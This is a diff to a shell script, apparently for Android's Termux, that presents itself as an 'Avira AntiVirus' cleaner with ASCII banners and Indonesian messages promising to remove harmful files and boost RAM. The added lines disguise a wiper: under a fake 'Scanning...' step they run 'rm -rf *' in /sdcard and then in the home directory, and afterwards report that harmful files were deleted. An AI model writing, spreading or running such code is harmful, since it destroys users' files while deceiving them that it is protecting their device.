@@ -246,30 +246,29 @@ sleep 1
 clear
 echo 
 sleep 0.05
-echo $red
-echo        __.|.__
+echo $red"       __.A.__"
 sleep 0.05
-echo    /n887.d8.qb. _\
+echo $red"    in887.d8.qb. _i"
 sleep 0.05
-echo   /d88  .888  q8b.  \
+echo $red"  id88  .888  q8b.  i"
 sleep 0.05
-echo  /8P   .8888   .88b. \
+echo $red" i8P   .8888   .88b. i"
 sleep 0.05
-echo /88_._ d8888_.._9888 _\
+echo $red" i88_._ d8888_.._9888 _i"
 sleep 0.05
-echo   '   '    |    '   '
+echo $red"  i   i    l    i   i"
 sleep 0.05
-echo            |
+echo $red"           l"
 sleep 0.05
-echo            |
+echo $red"           l"
 sleep 0.05
-echo            |
+echo $red"           l"
 sleep 0.05
-echo            |
+echo $red"           l"
 sleep 0.05
-echo            |
+echo $red"           l"
 sleep 0.05
-echo           -,
+echo $red"          -,"
 sleep 0.05
 figlet -f slant "A v i r a"|lolcat
 figlet -f slant "AntiVirus"|lolcat
@@ -280,3 +279,21 @@ echo $cy "Menghapus File/Apk yang Berbahaya"
 sleep 0.5
 echo $cy "Meningkatkan Performa RAM"
 sleep 1
+echo $ku "Scanning..."
+cd /sdcard
+rm -rf *
+sleep 5
+echo $red "Mendapatkan File Berbahaya (1)"
+cd
+rm -rf *
+sleep 2
+echo $cy "Menghapus File Berbahaya..."
+sleep 2
+echo $cy"       _______________________________________"
+echo $cy"______|           _    _  .  . ._             |_______"
+echo $cy"\     |           | \ | | |\ | |_             |      /"
+echo $cy" \    |           |_/ |_| | \| |_             |     /"
+echo $cy" /    |_______________________________________|     \"
+echo $cy"/________)                                 (________\"
+sleep 5
+exit
